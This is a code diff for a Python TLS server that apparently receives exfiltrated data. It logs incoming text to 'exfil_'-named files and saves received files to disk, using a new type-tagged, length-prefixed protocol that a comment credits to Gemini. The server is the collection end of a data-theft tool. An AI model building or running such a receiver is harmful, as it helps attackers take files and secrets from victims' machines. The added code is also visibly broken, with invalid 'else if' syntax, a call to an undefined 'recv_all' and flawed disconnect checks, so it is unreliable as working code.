@@ -15,6 +15,7 @@ if not os.path.exists(LOG_DIR):
 def decrypt(b):
     return b.decode().replace('\\n', '\n')
 
+'''
 def receiveMessage(a, c):
     client_ip, client_port = a
     log_file = os.path.join(LOG_DIR, f"exfil_{client_ip}_{client_port}.log")
@@ -40,6 +41,61 @@ def receiveMessage(a, c):
                 f.write(f"--- Log entry at {timestamp} ---\n")
                 f.write(response)
                 f.write("\n\n")
+'''
+
+# Gemini suggested modifications added by hand -- receive a buffer of n bytes
+def recv_all_n(s, n):
+    data = bytearray()
+
+    while len(data) < n:
+        packet = s.recv(n - len(data))
+        if not packet:
+            return None
+        data.extend(packet)
+    return data
+
+def receiveMessage(a, c):
+    client_ip, client_port = a
+    log_file = os.path.join(LOG_DIR, f"exfil_{client_ip}_{client_port}.log")
+
+    with c:
+        print(f"Connected to {a}, logging to {log_file}")
+
+        while True:
+            type_tag = c.recv(1)
+            if type_tag == None:
+                print(f"Disconnected from {a}")
+                break
+            length_bytes = recv_all_n(c, 4)
+            if length_bytes == None:
+                print(f"Disconnected from {a}")
+                break
+            length = struct.unpack("!I", length_bytes)[0]
+
+            payload = recv_all(c, length)
+            if payload == None:
+                print(f"Disconnected from {a}")
+                break
+
+            if type_tag == b'T':
+                decrypted = decrypt(payload) # Text handling
+                with open(log_file, 'a') as f:
+                    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    f.write(f"--- Log entry at {timestamp} ---\n")
+                    f.write(decrypted)
+                    f.write("\n\n")
+
+            else if type_tag == b'F':
+                decrypted = payload
+
+                i = 0
+                filename = "file0.data"
+                while os.path.exists(f"file{i}.data"):
+                    i += 1
+                    filename = f"file{i}.data"
+
+                with open(filename, "wb") as f:
+                    f.write(decrypted)
 
 # Create SSL context
 ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
